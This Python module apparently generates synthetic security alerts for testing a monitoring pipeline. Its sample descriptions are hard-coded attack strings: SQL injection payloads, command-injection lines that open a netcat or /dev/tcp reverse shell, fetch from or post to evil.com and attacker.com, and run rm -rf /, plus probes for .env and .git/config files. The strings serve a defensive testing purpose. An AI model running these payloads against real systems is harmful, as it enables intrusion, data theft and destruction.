from ..models.alert_scheme import Alert
from ipaddress import IPv4Address
from typing import List, Tuple
import logging
import random
import time

class AlertsGenerator:
    
    def __init__(self, num_alerts, alerts_interarrival_ms):
        self.num_alerts = num_alerts
        self.alerts_interval = alerts_interarrival_ms
        
        self.alert_ids = [40, 41, 42, 68, 61, 79]
        
        self.countries_asns = {
            'US': [7922, 15169, 16509, 20940, 36351],
            'CN': [4134, 4837, 9394, 17623, 37963],
            'RU': [8359, 12389, 29182, 31133, 48642],
            'DE': [3320, 8767, 29562, 31334, 35244],
            'FR': [3215, 5410, 12322, 15557, 16276], 
            'GB': [2856, 5607, 12576, 20712, 25180], 
            'JP': [2497, 4713, 7506, 9605, 17676], 
            'KR': [4766, 9318, 17858, 45400, 9644],  
            'IN': [4755, 9829, 17813, 24560, 45609], 
            'BR': [7738, 8167, 16735, 18881, 28573], 
        }
        
        self.private_ranges = [
            ('192.168.0.0', '192.168.255.255'),
            ('10.0.0.0', '10.255.255.255'),
            ('172.16.0.0', '172.31.255.255'),
            ('127.0.0.0', '127.255.255.255')
        ]
        
        self.sql_injections = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 'x'='x",
            "1'; INSERT INTO log VALUES('hacked'); --"
        ]
        
        self.rce_payloads = [
            "; cat /etc/passwd",
            "&& whoami",
            "| nc -l -p 4444 -e /bin/sh",
            "; wget http://evil.com/shell.sh",
            "&& curl -X POST http://attacker.com/data",
            "| python -c 'import os; os.system(\"rm -rf /\")'",
            "; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "&& powershell -enc SQBuAHYAbwBrAGUA"
        ]
        
        self.ssh_versions = [
            "OpenSSH_4.3",
            "OpenSSH_5.1",
            "OpenSSH_6.0",
            "libssh_0.6.1",
            "OpenSSH_7.2"
        ]
        
        self.scanner_info = [
            "possible zmap detected",
            "possible masscan detected",
            "port scan detected",
            "botnet scanner activity"
        ]
        
        self.exploit_patterns = [
            "URL starting with dot (.env)",
            "/.env",
            "/.prod.env",
            "/media../.git/config",
            "/assets../.git/config",
            "/project/.git/config",
        ]
    
    def generate_ip(self, is_localhost=None):
        """Generate a random IP address, optionally forcing localhost/private"""
        if is_localhost is None:
            is_localhost = random.choice([True, False])
        
        if is_localhost:
            # Generate private IP
            range_choice = random.choice(self.private_ranges)
            start_ip = int(IPv4Address(range_choice[0]))
            end_ip = int(IPv4Address(range_choice[1]))
            random_int = random.randint(start_ip, end_ip)
            return IPv4Address(random_int)
        else:
            # Generate public IP (avoiding private ranges)
            while True:
                ip = IPv4Address(random.randint(1, 4294967294))  # Avoid 0.0.0.0 and 255.255.255.255
                if not ip.is_private and not ip.is_multicast and not ip.is_reserved:
                    return ip
    
    def generate_alert_id(self):
        """Generate a random alert ID from the available types"""
        return random.choice(self.alert_ids)
    
    def generate_alert_description(self, alert_id):
        """Generate realistic alert description based on alert ID"""
        if alert_id == 40:  # SQL Injection
            return f"{random.choice(self.sql_injections)}"
        elif alert_id == 41:  # RCE Injection
            return f"{random.choice(self.rce_payloads)}"
        elif alert_id == 42:  # Empty or missing user agent
            return "HTTP request with empty or missing User-Agent header"
        elif alert_id == 68:  # Possible Exploit
            return random.choice(self.exploit_patterns)
        elif alert_id == 61:  # SSH obsolete version
            return f"{random.choice(self.ssh_versions)}"
        elif alert_id == 79:  # Malicious Fingerprint
            return random.choice(self.scanner_info)
    
    def generate_country_code(self):
        """Generate a random country code"""
        return random.choice(list(self.countries_asns.keys()))
    
    def generate_asn(self, country_code=None):
        """Generate a realistic ASN, optionally for a specific country"""
        if country_code and country_code in self.countries_asns:
            return random.choice(self.countries_asns[country_code])
        else:
            # Return random ASN from any country
            all_asns = [asn for asns in self.countries_asns.values() for asn in asns]
            return random.choice(all_asns)
    
    def generate_srv_port(self, alert_id):
        """Generate realistic alert server ports on alert ID"""
        if alert_id in [40, 41, 42, 68, 79]:
            return random.choice([80, 8080, 443])
        
        elif alert_id == 61:  # SSH obsolete version
            return 22
        
    def generate_alerts(self):
        """Generate the specified number of alerts with realistic data"""
        alerts = []
        
        for alert_idx in range(self.num_alerts):
            alert = self.generate_alert()
            
            alerts.append(alert)
            
            #print(alert.model_dump(mode='json'))
            
            # Sleep between alerts (convert ms to seconds)
            # Don't sleep after the last alert
            if alert_idx < self.num_alerts - 1:
                time.sleep(self.alerts_interval / 1000)
        
        return alerts
    
    def generate_alert(self):
        # Generate alert ID first to influence other properties
        alert_id = self.generate_alert_id()
        
        # Generate client info
        cli_localhost = random.choice([True, False])
        cli_ip = self.generate_ip(cli_localhost)
        cli_country = self.generate_country_code()
        cli_asn = self.generate_asn(cli_country)
        
        # Generate server info
        # Servers are more likely to be localhost/internal for injection attacks
        if alert_id in [40, 41, 68]:  # Injection/exploit attacks usually target internal servers
            srv_localhost = random.choices([True, False], weights=[0.7, 0.3])[0]
        else:
            srv_localhost = random.choice([True, False])
        
        srv_ip = self.generate_ip(srv_localhost)
        srv_country = self.generate_country_code()
        srv_asn = self.generate_asn(srv_country)
        srv_port = self.generate_srv_port(alert_id)
        
        # Generate alert description
        info = self.generate_alert_description(alert_id)
        
        # Create alert object
        alert = Alert(
            cli_ip=cli_ip,
            cli_localhost=cli_localhost,
            cli_country=cli_country,
            cli_asn=cli_asn,
            
            srv_ip=srv_ip,
            srv_port=srv_port,
            srv_localhost=srv_localhost,
            srv_country=srv_country,
            srv_asn=srv_asn,
            
            alert_id=alert_id,
            info=info
        )
        
        return alert
        
    def get_alert_type_name(self, alert_id):
        """Get human-readable alert type name"""
        type_names = {
            40: "SQL Injection",
            41: "RCE Injection", 
            42: "Missing User Agent",
            68: "Possible Exploit",
            61: "SSH Obsolete Version",
            79: "Malicious Fingerprint"
        }
        return type_names.get(alert_id, "Unknown")

    def print_alert(self, alert):
        print(alert.model_dump(mode='json'))    